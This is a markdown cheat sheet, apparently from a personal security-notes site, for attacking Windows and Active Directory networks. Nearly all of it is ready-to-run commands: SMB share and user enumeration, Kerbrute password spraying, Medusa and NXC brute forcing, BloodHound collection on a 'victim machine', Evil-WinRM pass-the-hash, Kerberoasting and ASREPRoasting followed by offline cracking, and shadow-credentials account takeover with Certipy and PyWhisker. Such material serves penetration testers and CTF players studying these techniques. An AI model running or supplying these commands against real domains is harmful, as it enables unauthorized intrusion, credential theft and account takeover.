---
title: "🪟 Windows & Active Directory Hacking"
summary: "Comprehensive overview of hacking techniques targeting Windows environments, including Active Directory exploitation, privilege escalation, lateral movement, and post-exploitation."
weight: 5
---

<style>
    img {
        transition: transform 0.3s ease;
    }
    img:hover {
        transform: scale(1.05);
    }
</style>

## Table of Contents

<div style="background-color: rgba(255, 255, 255, 0.1); padding:10px; border-radius:8px;">
<details>
  <summary>🔍 Enumeration & Discovery</summary>

- [SMBMap](#smbmap)
- [SMBClient](#smbclient)
- [Enum4Linux](#enum4linux)
- [Kerberos User Enumeration & Brute Force (Kerbrute)](#kerberos-user-enumeration--brute-force-kerbrute)
- [BloodHound](#bloodhound)

</details>

<details>
  <summary>🔑 Credential Exploitation & Initial Access</summary>

- [Brute Force SMB Password (Known Username)](#brute-force-smb-password-known-username)
- [CrackMapExec (CME)](#crackmapexec-cme)
- [NXC](#nxc)
- [Evil-WinRM](#evil-winrm)

</details>

<details>
  <summary>🎯 Active Directory Specific Attacks</summary>

- [Kerberoasting Attack](#kerberoasting-attack)
- [ASREPRoast Attack (Impacket)](#asreproast-attack-impacket)
- [Shadow Credentials Attack](#shadow-credentials-attack)
- [Other Uses of Impacket](#other-uses-of-impacket)

</details>
</div>



<div style="margin-top: 70px;"></div>

# 🕵️ Enumeration & Discovery
----

## SMBMap

Tool for enumerating SMB shares and permissions quickly.

- Enumerate shares on a host:

```
smbmap -H IP
```

- Enumerate shares with user credentials:

```
smbmap -H IP -u USER -p PASSWORD
```

- Download files:

```
smbmap -H IP -u USER -p PASSWORD --download file
```

## SMBClient

Command-line tool to interact with SMB shares.

- List shares on remote host:

```
smbclient -L //IP -U USER%PASSWORD
```

- Connect to a specific share:

```
smbclient //IP/SHARE -U USER%PASSWORD
```

## Enum4Linux

Linux tool for SMB/Windows enumeration.

- Full scan of a host:

```
enum4linux -a IP
```

## Kerberos User Enumeration & Brute Force (Kerbrute)

- Enumerate valid users in AD via Kerberos pre-auth.

```
./kerbrute userenum -d DOMAIN --dc DC_IP users.txt
```

- Brute force passwords for a single user

```
./kerbrute bruteuser -d DOMAIN --dc DC_IP passwords.txt username
```

- Brute force passwords for multiple users

```
./kerbrute passwordspray -d DOMAIN --dc DC_IP --users users.txt --passwords passwords.txt
```

- Password spray attack (single password for many users)

```
./kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt PASSWORD
```

> 🚨 **ALERT:** Always be careful with **bruteuser** and **passwordspray** in **real environments**, Kerberos pre-auth failures **can trigger account lockouts** if too many invalid attempts are made.

## BloodHound


<div style="display: flex; justify-content: center;">
  <img src="/images/hacking/bloodhoundce.jpg" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
</div>

**BloodHound** is a powerful tool that allows you to **graphically** enumerate an entire **Active Directory domain**. It can gather information externally without needing full access to domain machines. Even if you only have a user with SMB access and cannot log into the machine directly, **you can still collect valuable data**.

### Collecting Data with BloodHound.py

To collect data for **BloodHound**, you need the **BloodHound.py** Python script:

GitHub repo: [Bloodhound](https://github.com/dirkjanm/BloodHound.py)

Clone the repository:

```
git clone https://github.com/dirkjanm/BloodHound.py.git
```

Enter the directory and run it like this:

```
python3 bloodhound.py -u 'USER' -p 'PASSWORD' -ns IP -d 'DOMAIN.ABC' -v --zip -c all
```

Or if you have the tool installed system-wide as bloodhound-python, you can use:

```
bloodhound-python -d 'DOMAIN.ABC' -u 'USER' -p 'PASSWORD' -gc 'DC01.DOMAIN.ABC' -ns IP -v --zip -c all
```

### Using SharpHound (Windows Agent)

SharpHound is the original and official Windows-based data collector for BloodHound.
Unlike bloodhound-python, which runs remotely from Linux, SharpHound must be executed inside a Windows system in the target domain. This allows it to gather more detailed and internal information, such as local sessions, group memberships, and object ACLs, that might not be accessible externally.

Download it from: [SharpHound](https://github.com/SpecterOps/SharpHound/tags)

```
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.1/SharpHound_v2.7.1_windows_x86.zip
unzip SharpHound_v2.7.1_windows_x86.zip
```

Upload SharpHound.exe to the victim machine and run:

```
.\SharpHound.exe -c all --zip
```

```
.\SharpHound.exe -c All -d DOMAIN.ABC
```


This will generate .json files containing the collected domain information.

### Importing Data into BloodHound

Once you have gathered the necessary data, if you haven’t installed the BloodHound interface yet, you can set it up as follows:

**1. Download the Docker Compose configuration for BloodHound:**

```
curl -L https://ghst.ly/getbhce -o docker-compose.yml
```

**2. Pull the required Docker images and start the BloodHound service:**

```
sudo docker compose pull && sudo docker compose up
```
> ⚠️ **IMPORTANT**: The first time you launch **BloodHound**, it will display an “**Initial password set to**” message. When you access the interface via your web browser, you’ll be able to change this to a password of your choice.

Fist time:

```
email address: admin
password: <Initial password>
```

Inside the web interface, click on “**Import Data**” and upload the **ZIP** file containing the data you collected.


<div style="margin-top: 70px;"></div>

# 🔓 Credential Exploitation & Initial Access

----

## Brute Force SMB Password (Known Username)

Use Medusa for password brute forcing.

```
medusa -h IP -u USERNAME -P /usr/share/wordlists/rockyou.txt -M smbnt
```

## CrackMapExec (CME)

<div style="display: flex; justify-content: center;">
  <img src="/images/hacking/crackmapexec.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
</div>

A powerful post-exploitation tool for SMB enumeration and exploitation on Windows networks.

- Basic enumeration of SMB shares and users:

```
crackmapexec smb IP
```

- Authenticate with username/password:

```
crackmapexec smb IP -u USER -p PASSWORD
```

- Brute force users and passwords:

```
crackmapexec smb IP -u users.txt -p passwords.txt
```

> Note: CME is no longer maintained, consider alternatives.


## NXC

- Find shared folders accessible to everyone:

```
nxc smb --shares -u 'afsd' -p '' -t 1 IP
```

- Enumerate users by RID brute force starting at 20000:

```
nxc smb -u 'asdf' -p '' --rid-brute 20000 IP
```

- Bruteforce attack with a user list and a single password:

```
nxc smb IP -u users.txt -p PASSWD
```

- Bruteforce attack with user and password lists, 4 threads, continue on success, and enumerate users:

```
nxc smb -u users.txt -p passwd.txt -t 4 IP --users --continue-on-success
```

## Evil-WinRM

<div style="display: flex; justify-content: center;">
  <img src="https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
</div>

Remote PowerShell shell over WinRM.

- Connect with user/password:

```
evil-winrm -i IP -u USER -p PASSWORD
```

- Pass-the-Hash authentication:

```
evil-winrm -i IP -u USER -H NTLM_HASH
```

<div style="margin-top: 70px;"></div>

# 🎯 Active Directory Specific Attacks

----

## Kerberoasting Attack

Attack to request and crack Kerberos service tickets to obtain service account passwords.

- First sync time:

```
sudo ntpdate VICTIM_IP
```

Or use faketime

```
faketime 'YYYY-MM-DD HH:MM:SS' ...
```

- Request service tickets with Impacket:

```
impacket-GetUserSPNs DOMAIN/USER:PASSWD -request
```

```
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -request -dc-ip DC_IP
```

Alternative tool: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
```

```
./targetedKerberoast.py -d DOMAIN -u USER -p PASSWORD
```

## ASREPRoast Attack (Impacket)

The ASREPRoast attack targets user accounts in Active Directory that do not require pre-authentication. This allows an attacker to request a service ticket (TGT) for those users without providing a password, and then attempt to crack the resulting encrypted ticket offline to recover the user’s password.

```
impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC_IP
```

You can also run it without specifying the domain controller IP:

```
impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt
```

If a user is vulnerable, you will receive output that includes an AS-REP hash for that user, which looks something like this:

```
$krb5asrep$...$user@DOMAIN
```

This hash can be saved to a file for offline cracking.

### Cracking the hash:

You can use a tool like John the Ripper to crack the captured AS-REP hash locally:

```
john --format=krb5asrep hashfile.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


## Shadow Credentials Attack

Attack to take over AD accounts by abusing msDS-KeyCredentialLink attribute (requires **GenericWrite** rights).

### Using Certipy

- First sync time:

```
sudo ntpdate VICTIM_IP
```

- Auto shadow attack:

```
certipy shadow auto -username USER@DOMAIN -p PASSWORD -account TARGET_USER -target DC
```

- Use faketime to bypass time restrictions:

```
faketime 'YYYY-MM-DD HH:MM:SS' certipy shadow auto -u USER@DOMAIN -p PASSWORD -account TARGET_USER -target DC
```

- Find users vulnerable to shadow credentials attack.

```
certipy find -vulnerable -u USER -hashes HASH -dc-ip DC_IP -stdout
```

### Using PyWhisker

Python alternative for shadow credentials attack.

```
pywhisker.py -d DOMAIN -u USER -p PASSWORD --target TARGET --action add
```

## Other Uses of Impacket

Brute-force SID enumeration to discover existing users from a given username and password:

```
impacket-lookupsid USER:PASSWORD@IP
```

Sometimes no password is required:

```
impacket-lookupsid USER@IP
```

This command enumerates Security Identifiers (SIDs) from the target system and maps them to usernames, allowing you to identify valid accounts in the domain or local system.

